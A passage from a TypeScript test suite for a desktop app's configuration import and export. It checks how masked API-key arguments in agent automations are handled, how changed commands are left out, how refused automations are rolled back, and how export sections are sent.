    read.doc.sections.automations = [{ ...automation({ id: "ag", name: "Review", args }), enabled: false, env: [] }]
      .map(({ last_run: _a, last_session: _b, last_error: _c, next_run: _d, ...a }) => a);
    const cur = current();
    cur.automations = local ? [automation({ id: "ag", name: "Review", args: local })] : [];
    return planImport(read, ["automations"], cur, { defaults, newId });
  };

  it("keeps an agent automation's local arguments whole, or leaves a new one out, when a masked one has no value here", () => {
    const kept = agentAutomation(["--search", "-c", `api_key=${M}`], ["--model", "opus"]);
    expect(kept.automations.map((a) => a.next.args)).toEqual([["--model", "opus"]]);
    expect(kept.argsNotImported).toEqual([{ section: "automations", item: "Review" }]);
    expect(kept.fillIn).toEqual([]);
    const fresh = agentAutomation(["--search", "-c", `api_key=${M}`]);
    expect(fresh.automations).toEqual([]);
    expect(fresh.argsNotImported).toEqual([]);
    expect(fresh.fillIn).toEqual([{ section: "automations", item: "Review", fields: ["args:api_key"], leftOut: true }]);
    expect(fresh.sections.automations!.skipped).toBe(1);
  });

  it("imports an agent automation's arguments whose masked ones are all filled in from here", () => {
    const p = agentAutomation(["--search", "-c", `api_key=${M}`], ["-c", "api_key=real"]);
    expect(p.automations.map((a) => a.next.args)).toEqual([["--search", "-c", "api_key=real"]]);
    expect(p.argsNotImported).toEqual([]);
    expect(p.keptLocal).toEqual([{ section: "automations", item: "Review", fields: ["args:api_key"] }]);
  });

  it("says when this computer's value was kept", () => {
    expect(agentArgs(["--api-key", M], ["--api-key", "realkey"]).kept).toEqual([{ section: "agents", item: "Claude Code", fields: ["args:--api-key"] }]);
  });

  it("leaves out a command that would run differently", () => {
    const read = fileRead();
    read.doc.sections.automations = [{ ...automation({ id: "d", name: "Deploy", action: "shell", kind: "", shell: { program: "pwsh", argv: ["deploy.ps1", "-WhatIf", `https://u:${M}@h`] } }), enabled: false, env: [] }]
      .map(({ last_run: _a, last_session: _b, last_error: _c, next_run: _d, ...a }) => a);
    const p = planImport(read, ["automations"], current(), { defaults, newId });
    expect(p.automations).toEqual([]);
    expect(p.fillIn).toEqual([{ section: "automations", item: "Deploy", fields: ["command:#3"], leftOut: true }]);
  });
});

describe("what runs, round 2", () => {
  it("lists a host's key file and target, and an automation's trigger, schedule, action and delivery", () => {
    const read = fileRead();
    read.doc.sections.sshHosts![2] = { ...read.doc.sections.sshHosts![2], identityFile: "~/keys/deploy", user: "ops", port: 2222, jump: "bastion" };
    read.doc.sections.automations![0] = { ...read.doc.sections.automations![0], trigger: { event: "file", glob: "**/*", daily_cap: 50 } };
    read.doc.sections.automations![1] = { ...read.doc.sections.automations![1], every: "weekly", time: "03:00", weekday: 0, deliver: "review" };
    const runs = planImport(read, ALL, current(), { defaults, newId }).runs;
    const find = (item: string, field: string) => runs.find((r) => r.item === item && r.field === field);
    expect(find("new", "target")).toMatchObject({ before: null, after: "ops@new.example:2222 via bastion" });
    expect(find("new", "identityFile")).toMatchObject({ before: null, after: "~/keys/deploy" });
    expect(find("Nightly", "when")).toMatchObject({ before: "daily 09:00", after: "file **/* ≤50/day" });
    expect(find("Report", "when")).toMatchObject({ before: null, after: "weekly 03:00 (0)" });
    expect(find("Report", "deliver")).toMatchObject({ before: null, after: "review" });
    expect(find("Report", "action")).toMatchObject({ before: null, after: "agent" });
  });
});

describe("a daemon that kept a refused automation", () => {
  it("is caught even when only switched-off, schedule or variables differ from the local one", async () => {
    // The file's Nightly runs the same command as the local one; it differs only in what the earlier check
    // ignored (switched off, its project, its schedule).
    const read = fileRead();
    read.doc.sections.automations = [{ ...automation({ id: "local-a", name: "Nightly", action: "shell", kind: "", shell: { program: "python", argv: ["old.py"] }, every: "weekly" }), enabled: false, env: [{ name: "TOKEN" }] }]
      .map(({ last_run: _a, last_session: _b, last_error: _c, next_run: _d, ...a }) => a);
    const { m, ctx } = machine({ refuse: "Nightly", keepRefused: true });
    const preview = planImport(read, ["automations"], await loadCurrent(["automations"], ctx), { defaults, newId });
    const err = await applyImport(read, ["automations"], preview, ctx, checked).catch((e) => e);
    expect(err).toBeInstanceOf(ImportFailed);
    // Put back as it was, with its approval.
    expect(m.automations.get("local-a")).toMatchObject({ enabled: true, every: "daily", command_approved: true });
  });
});

describe("loadForPreview", () => {
  it("marks a section it cannot read instead of blocking the others", async () => {
    const { ctx } = machine({ failHosts: true });
    ctx.automationsSupported = () => false;
    const { cur, unavailable } = await loadForPreview(["settings", "sshHosts", "automations", "plugins"], ctx);
    expect(Object.keys(unavailable).sort()).toEqual(["automations", "sshHosts"]);
    expect(unavailable.automations).toContain("session daemon");
    expect(cur.plugins).toEqual(["here"]);
    expect(planShown(planImport(fileRead(), ["settings", "plugins"], cur, { defaults, newId })).sections.plugins).toMatchObject({ add: 1 });
  });
});

describe("exportConfig", () => {
  it("sends the window's sections and leaves hosts and plugins to the app core", async () => {
    const sent: any[] = [];
    const { ctx } = machine();
    ctx.invoke = async <T,>(cmd: string, args: any): Promise<T> => {
      sent.push([cmd, args]);
      return { path: args.path, counts: {} } as T;
    };
    await exportConfig("C:/out.json", ["settings", "agents", "automations", "sshHosts"], false, ctx);
    const [cmd, args] = sent[0];
    expect(cmd).toBe("config_export");
    expect(Object.keys(args.sections).sort()).toEqual(["agents", "automations", "settings"]);
    expect(args.sections.settings.accounts).toBeUndefined();
    expect(args.wanted).toEqual(["settings", "agents", "automations", "sshHosts"]);
    expect(args.includeEnvValues).toBe(false);
  });

  it("needs a daemon with automations for that section", async () => {
    const { ctx } = machine();
    ctx.automationsSupported = () => false;
    await expect(exportConfig("C:/out.json", ["automations"], false, ctx)).rejects.toThrow("session daemon");
  });
});
